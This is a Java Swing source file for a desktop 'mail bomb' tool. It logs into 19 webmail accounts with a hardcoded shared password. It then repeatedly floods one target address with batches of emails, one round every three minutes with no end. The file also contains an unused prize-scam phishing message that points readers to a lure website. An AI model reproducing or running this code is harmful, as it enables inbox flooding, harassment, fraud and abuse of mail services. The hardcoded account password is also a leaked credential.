package com.b510.sendmail.ui;

import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.StringTokenizer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;

import sun.misc.BASE64Encoder;

import com.b510.sendmail.utils.AboutSendmail;
import com.b510.sendmail.utils.MailMessage;

/**
 * 
 * @author Hongten
 */
public class SendMailUI extends JFrame implements ActionListener {

	private static javax.swing.JTextArea infoShow;
	private javax.swing.JScrollPane jScrollPane1;
	private javax.swing.JPanel mainPanel;
	private javax.swing.JMenuBar menuBar;
	private javax.swing.JButton send;
	private javax.swing.JProgressBar showTime;
	private javax.swing.JTextField targetmail;
	javax.swing.JMenu fileMenu;
	javax.swing.JMenuItem exitMenuItem;
	javax.swing.JMenu helpMenu;
	javax.swing.JMenuItem aboutMenuItem;
	private static boolean flag;
	private static int number = 266;
	private int i = 0;
	private AboutSendmail aboutSendmail;
	/**
	 * 定义图盘图盘标志
	 */
	public boolean iconed = false;
	/** 定义托盘 */
	MyTray myTray;

	/**
	 * 版本号
	 */
	private static final long serialVersionUID = -6601825053136983041L;

	public SendMailUI(String title) {
		this.setTitle(title);
		init();
	}

	/**
	 * 主界面初始化
	 */
	public void init() {

		mainPanel = new JPanel() {
			private static final long serialVersionUID = 1L;

			protected void paintComponent(Graphics g) {
				ImageIcon icon = new ImageIcon("src/resources/mail_bg.png");
				g.drawImage(icon.getImage(), 0, 0, 700, 430, null);
			}
		};

		targetmail = new javax.swing.JTextField();
		send = new javax.swing.JButton();
		jScrollPane1 = new javax.swing.JScrollPane();
		infoShow = new javax.swing.JTextArea();
		menuBar = new javax.swing.JMenuBar();
		fileMenu = new javax.swing.JMenu();
		exitMenuItem = new javax.swing.JMenuItem();
		helpMenu = new javax.swing.JMenu();
		aboutMenuItem = new javax.swing.JMenuItem();
		// 设置为0到180，即180s，3分钟
		showTime = new javax.swing.JProgressBar(0, number);
		aboutSendmail = new AboutSendmail("关于软件");
		aboutSendmail.setVisible(false);

		// 是否在进度条上显示字符
		showTime.setStringPainted(true);

		mainPanel.setName("mainPanel"); // NOI18N

		targetmail.setName("targetmail"); // NOI18N
		//targetmail.setText("hongtenzone@foxmail.com");

		send.setText("send"); // NOI18N
		send.setName("send"); // NOI18N
		send.setEnabled(false);
		send.addActionListener(this);

		jScrollPane1.setName("jScrollPane1"); // NOI18N

		infoShow.setColumns(20);
		infoShow.setRows(5);
		infoShow.setName("infoShow"); // NOI18N
		jScrollPane1.setViewportView(infoShow);
		// 初始化布局
		initComponent();

		menuBar.setName("menuBar"); // NOI18N

		fileMenu.setName("fileMenu"); // NOI18N
		fileMenu.setText("file");

		exitMenuItem.setText("exit");
		fileMenu.add(exitMenuItem);
		exitMenuItem.addActionListener(this);

		menuBar.add(fileMenu);

		helpMenu.setText("help"); // NOI18N
		helpMenu.setName("helpMenu"); // NOI18N

		aboutMenuItem.setText("about");
		helpMenu.add(aboutMenuItem);
		aboutMenuItem.addActionListener(this);

		menuBar.add(helpMenu);

		this.add(mainPanel);
		setJMenuBar(menuBar);

		this.setVisible(true);
		this.setSize(700, 485);
		// 启动进度条记时监听器
		timeCardListener();
		// 启动邮箱输入框监听器
		myListener();
		// this.pack();
		this.setLocationRelativeTo(null);
		this.setResizable(false);
		// this.setLocation(470, 250);
		// this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		// 当点击"-"最小化按钮时，系统会最小化到托盘
		addWindowListener(new WindowAdapter() {
			public void windowIconified(WindowEvent e) {
				iconed = true;
				setVisible(false);
			}

			public void windowClosing(WindowEvent e) {
				// 当点击"X"关闭窗口按钮时，会询问用户是否要最小化到托盘
				// 是，表示最小化到托盘，否，表示退出
				int option = JOptionPane.showConfirmDialog(SendMailUI.this,
						"是否最小化到托盘?", "提示:", JOptionPane.YES_NO_OPTION);
				if (option == JOptionPane.YES_OPTION) {
					iconed = true;
					SendMailUI.this.setVisible(false);
				} else {
					System.exit(0);
				}
			}
		});
		// 初始化自定义托盘
		myTray = new MyTray(SendMailUI.this);

	}

	/**
	 * 布局文件，没有必要去管他
	 */
	private void initComponent() {
		javax.swing.GroupLayout mainPanelLayout = new javax.swing.GroupLayout(
				mainPanel);
		mainPanel.setLayout(mainPanelLayout);
		mainPanelLayout
				.setHorizontalGroup(mainPanelLayout
						.createParallelGroup(
								javax.swing.GroupLayout.Alignment.LEADING)
						.addGroup(
								mainPanelLayout
										.createSequentialGroup()
										.addGap(52, 54, 54)
										.addGroup(
												mainPanelLayout
														.createParallelGroup(
																javax.swing.GroupLayout.Alignment.LEADING,
																false)
														.addGroup(
																mainPanelLayout
																		.createSequentialGroup()
																		.addComponent(
																				targetmail,
																				javax.swing.GroupLayout.PREFERRED_SIZE,
																				170,
																				javax.swing.GroupLayout.PREFERRED_SIZE)
																		.addGap(
																				34,
																				34,
																				37)
																		.addComponent(
																				send))
														.addComponent(
																jScrollPane1,
																javax.swing.GroupLayout.Alignment.TRAILING,
																javax.swing.GroupLayout.PREFERRED_SIZE,
																620,
																javax.swing.GroupLayout.PREFERRED_SIZE)
														.addGroup(
																mainPanelLayout
																		.createSequentialGroup()
																		.addGap(
																				463,
																				463,
																				463)
																		.addComponent(
																				showTime,
																				javax.swing.GroupLayout.DEFAULT_SIZE,
																				javax.swing.GroupLayout.DEFAULT_SIZE,
																				Short.MAX_VALUE)))
										.addContainerGap(30, Short.MAX_VALUE)));
		mainPanelLayout
				.setVerticalGroup(mainPanelLayout
						.createParallelGroup(
								javax.swing.GroupLayout.Alignment.LEADING)
						.addGroup(
								mainPanelLayout
										.createSequentialGroup()
										.addContainerGap()
										.addGroup(
												mainPanelLayout
														.createParallelGroup(
																javax.swing.GroupLayout.Alignment.TRAILING)
														.addComponent(send)
														.addComponent(
																targetmail,
																javax.swing.GroupLayout.PREFERRED_SIZE,
																30,
																javax.swing.GroupLayout.PREFERRED_SIZE))
										.addGap(30, 43, 43)
										.addComponent(
												showTime,
												javax.swing.GroupLayout.PREFERRED_SIZE,
												javax.swing.GroupLayout.DEFAULT_SIZE,
												javax.swing.GroupLayout.PREFERRED_SIZE)
										.addPreferredGap(
												javax.swing.LayoutStyle.ComponentPlacement.RELATED)
										.addComponent(
												jScrollPane1,
												javax.swing.GroupLayout.PREFERRED_SIZE,
												313,
												javax.swing.GroupLayout.PREFERRED_SIZE)
										.addGap(15, 15, 15)));
	}

	// 进度条记时
	public void timeCard(final boolean flag) {
		new Thread(new Runnable() {// 设置一个线程
					public void run() {
						if (flag) {
							while (i < number) {
								try {
									Thread.sleep((long) (1000 * 7.7));
								} catch (Exception e) {
									e.printStackTrace();
								}
								showTime.setValue(i++);
							}
						} else {
							i = 0;
							showTime.setValue(0);

						}
					}
				}).start();
	}

	// 进度条记时
	public void timeCardListener() {
		new Thread(new Runnable() {// 设置一个线程
					public void run() {
						while (true) {
							try {
								Thread.sleep((long) (1000 * 7.7));
							} catch (Exception e) {
								e.printStackTrace();
							}
							timeCard(flag);
						}
					}
				}).start();
	}

	@Override
	public void actionPerformed(ActionEvent e) {
		if (e.getSource() == send) {
			infoShow.append("请耐心等待...\n");
			new SendMail().sendMailListener(targetmail.getText());
		}
		// 退出程序
		if (e.getSource() == exitMenuItem) {
			System.exit(0);
		}
		if (e.getSource() == aboutMenuItem) {
			aboutSendmail.setVisible(true);
		}
	}

	/**
	 * STMP邮箱客户端，用于邮件发送和接收的管理
	 * 
	 * @author Hongten
	 * 
	 * @time 2012-4-4 2012
	 */
	static class SMTPClient {

		static final String server_mail = "smtp.163.com";
		static final String server_mail_sina = "smtp.sina.com";
		static final String subject_mail = "邮件炸弹";
		static final String content_mail = "这是邮件炸弹";
		static final String password_mail = "PANDER521521mail";
		static int k = 1;

		static final String content = "尊敬的邮箱用户：\n您好！您的账号已被抽选为本次活动的二等奖用户。您将获得由本公司送出的惊喜奖金66000元以及赞助商三星公司送出的三星Q40笔记本电脑一台!\n请您收到信息后立即复制登陆活动网站: www.qqt139.com 领取，您的获奖验证码为【6558】。请确记您的个人验证码。\n 注：为了确保您的幸运资格不被冒领，请及时查看邮件。否则此邮件自动转入垃圾信箱等待查收！从收到邮件5日内有效.";
		static final String content1 = "你好，当你收到这个邮件的时候，说明你...嘿嘿...你懂的";
		private boolean debug = true;
		BASE64Encoder encode = new BASE64Encoder();// 用于加密后发送用户名和密码

		/**
		 * 发送邮件
		 * 
		 * @throws UnknownHostException
		 *             未知异常
		 * @throws IOException
		 *             i/o异常
		 */
		public static void sendMail(String targetMail)
				throws UnknownHostException, IOException {
			for (int j = 1; j < 4; j++) {
				for (int i = 1; i < 10; i++) {
					MailMessage message = new MailMessage();
					message.setFrom("pandermail0" + i + "@163.com");// 发件人
					message.setTo(targetMail);// 收件人
					String server = server_mail;// 邮件服务器
					message.setSubject("有一封新的信息，請查收！");// 邮件主题
					message.setContent(content1);// 邮件内容
					message.setDatafrom("pandermail0" + i + "@163.com");// 发件人，在邮件的发件人栏目中显示
					message.setDatato(targetMail);// 收件人，在邮件的收件人栏目中显示
					message.setUser("pandermail0" + i);// 登陆邮箱的用户名
					message.setPassword(password_mail);// 登陆邮箱的密码

					SMTPClient smtp = new SMTPClient(server, 25);

					boolean flag;
					flag = smtp.sendMail(message, server);

					if (flag) {
						SendMailUI.infoShow.append("这是第 " + i + " 封邮件,"
								+ "邮件发送成功！\n");
					} else {
						SendMailUI.infoShow.append("邮件发送失败！\n");
					}
				}
				for (int i = 1; i < 11; i++) {
					MailMessage message = new MailMessage();
					// pandermail1@sina.com
					message.setFrom("pandermail" + i + "@sina.com");
					message.setTo(targetMail);// 收件人
					String server = server_mail_sina;// 邮件服务器
					message.setSubject("亚马逊");// 邮件主题
					message.setContent(content1);// 邮件内容
					message.setDatafrom("pandermail" + i + "@sina.com");// 发件人，在邮件的发件人栏目中显示
					message.setDatato(targetMail);// 收件人，在邮件的收件人栏目中显示
					message.setUser("pandermail" + i);// 登陆邮箱的用户名
					message.setPassword(password_mail);// 登陆邮箱的密码

					SMTPClient smtp = new SMTPClient(server, 25);

					boolean flag;
					flag = smtp.sendMail(message, server);

					if (flag) {
						SendMailUI.infoShow.append("这是第 " + (i + 9) + " 封邮件,"
								+ "邮件发送成功！\n");
					} else {
						SendMailUI.infoShow.append("邮件发送失败！\n");
					}
				}
			}
			SendMailUI.infoShow
					.append("==========================================================\n");
			SendMailUI.infoShow.append("===================== 这是第 [ " + (k++)
					+ " ] 轮结束  =====================\n");
		}

		private Socket socket;

		public SMTPClient(String server, int port) throws UnknownHostException,
				IOException {
			try {
				socket = new Socket(server, 25);
			} catch (SocketException e) {
				SendMailUI.infoShow.append(e.getMessage());
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				SendMailUI.infoShow.append("已经建立连接!\n");
			}
		}

		// 注册到邮件服务器
		public void helo(String server, BufferedReader in, BufferedWriter out)
				throws IOException {
			int result;
			result = getResult(in);

			// 连接上邮件服务后,服务器给出220应答
			if (result != 220) {
				SendMailUI.infoShow.append("连接服务器失败!\n");
				throw new IOException("连接服务器失败");
			}

			result = sendServer("HELO " + server, in, out);

			// HELO命令成功后返回250
			if (result != 250) {
				SendMailUI.infoShow.append("注册邮件服务器失败！\n");
				throw new IOException("注册邮件服务器失败！");
			}
		}

		private int sendServer(String str, BufferedReader in, BufferedWriter out)
				throws IOException {
			out.write(str);
			out.newLine();
			out.flush();

			if (debug) {
				SendMailUI.infoShow.append("已发送命令:" + str + "\n");
			}

			return getResult(in);
		}

		public int getResult(BufferedReader in) {
			String line = "";

			try {
				line = in.readLine();
				if (debug) {
					SendMailUI.infoShow.append("服务器返回状态:" + line + "\n");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			// 从服务器返回消息中读出状态码,将其转换成整数返回
			StringTokenizer st = new StringTokenizer(line, " ");

			return Integer.parseInt(st.nextToken());
		}

		public void authLogin(MailMessage message, BufferedReader in,
				BufferedWriter out) throws IOException {
			int result;
			result = sendServer("AUTH LOGIN", in, out);

			if (result != 334) {
				SendMailUI.infoShow.append("用户验证失败！\n");
				throw new IOException("用户验证失败！");
			}
			result = sendServer(encode.encode(message.getUser().getBytes()),
					in, out);

			if (result != 334) {
				SendMailUI.infoShow.append("用户名错误！\n");
				throw new IOException("用户名错误！");
			}
			result = sendServer(
					encode.encode(message.getPassword().getBytes()), in, out);

			if (result != 235) {
				SendMailUI.infoShow.append("验证失败！\n");
				throw new IOException("验证失败！");
			}
		}

		// 开始发送消息，邮件源地址
		public void mailfrom(String source, BufferedReader in,
				BufferedWriter out) throws IOException {
			int result;
			result = sendServer("MAIL FROM:<" + source + ">", in, out);

			if (result != 250) {
				SendMailUI.infoShow.append("指定源地址错误!\n");
				throw new IOException("指定源地址错误");
			}
		}

		// 设置邮件收件人
		public void rcpt(String touchman, BufferedReader in, BufferedWriter out)
				throws IOException {
			int result;
			result = sendServer("RCPT TO:<" + touchman + ">", in, out);

			if (result != 250) {
				SendMailUI.infoShow.append("指定目的地址错误！\n");
				throw new IOException("指定目的地址错误！");
			}
		}

		// 邮件体
		public void data(String from, String to, String subject,
				String content, BufferedReader in, BufferedWriter out)
				throws IOException {
			int result;
			result = sendServer("DATA", in, out);

			// 输入date回车后,若收到354应答后,继续输入邮件内容
			if (result != 354) {
				SendMailUI.infoShow.append("不能发送数据！\n");
				throw new IOException("不能发送数据!");
			}

			out.write("From: " + from);
			out.newLine();
			out.write("To: " + to);
			out.newLine();
			out.write("Subject: " + subject);
			out.newLine();
			out.newLine();
			out.write(content);
			out.newLine();

			// 句点加回车结束邮件内容输入
			result = sendServer(".", in, out);
			// System.out.println(result);

			if (result != 250) {
				SendMailUI.infoShow.append("发送数据错误!\n");
				throw new IOException("发送数据错误");
			}
		}

		// 退出
		public void quit(BufferedReader in, BufferedWriter out)
				throws IOException {
			int result;
			result = sendServer("QUIT", in, out);

			if (result != 221) {
				SendMailUI.infoShow.append("未能正确退出!\n");
				throw new IOException("未能正确退出");
			}
		}

		// 发送邮件主程序
		public boolean sendMail(MailMessage message, String server) {
			try {
				BufferedReader in = new BufferedReader(new InputStreamReader(
						socket.getInputStream()));
				BufferedWriter out = new BufferedWriter(new OutputStreamWriter(
						socket.getOutputStream()));
				helo(server, in, out);// helo
				authLogin(message, in, out);// auth login
				mailfrom(message.getFrom(), in, out);// mail from
				rcpt(message.getTo(), in, out);// rcpt to
				data(message.getDatafrom(), message.getDatato(), message
						.getSubject(), message.getContent(), in, out);// DATA
				quit(in, out);// quit
			} catch (Exception e) {
				e.printStackTrace();
				return false;
			}
			return true;
		}
	}

	class SendMail {
		public void sendMailListener(final String targetmail) {
			new Thread(new Runnable() {// 设置一个线程
						public void run() {
							while (true) {
								SendMailUI.flag = true;
								// 休息180s
								try {
									// 线程处于睡眠的时候，flag=true；
									SendMailUI.flag = true;
									Thread.sleep(180000);
								} catch (Exception e) {
									e.printStackTrace();
								}
								// 这里开始运行的时候，flag=false；
								SendMailUI.flag = false;
								try {
									SMTPClient.sendMail(targetmail);
								} catch (UnknownHostException e) {
									e.printStackTrace();
								} catch (IOException e) {
									e.printStackTrace();
								}
								try {
									// 等待timeCardListener监听器监听时间
									Thread.sleep(25000);
								} catch (Exception e) {
								}
							}
						}

					}).start();
		}
	}

	// 邮箱匹配，返回true，否则返回false
	private boolean isRightMail(String mail) {
		boolean flag_mail = false;
		Pattern pattern;
		Matcher matcher;
		String mail_regex = "(?=^[\\w.@]{6,50}$)\\w+@\\w+(?:\\.[\\w]{2,3}){1,2}";
		pattern = Pattern.compile(mail_regex);
		matcher = pattern.matcher(mail);
		while (matcher.find()) {
			flag_mail = true;
		}
		return flag_mail;
	}

	// 邮箱输入框是否正确填写
	public void changedUpdate() {
		String mail = targetmail.getText();
		if (mail.equals("")) {
			send.setEnabled(false);
		} else if (mail.length() > 0 && isRightMail(mail)) {
			// 输入内容不为空，且是能够匹配邮箱，那么设置send可用
			send.setEnabled(true);
		} else {
			send.setEnabled(true);
		}
	}

	/**
	 * 邮箱是否填写完整监听器
	 */
	public void myListener() {
		new Thread(new Runnable() {// 设置一个线程
					public void run() {
						while (true) {
							try {
								Thread.sleep(500);
							} catch (Exception e) {
								e.printStackTrace();
							}
							changedUpdate();// 填写邮箱
						}
					}
				}).start();
	}
}
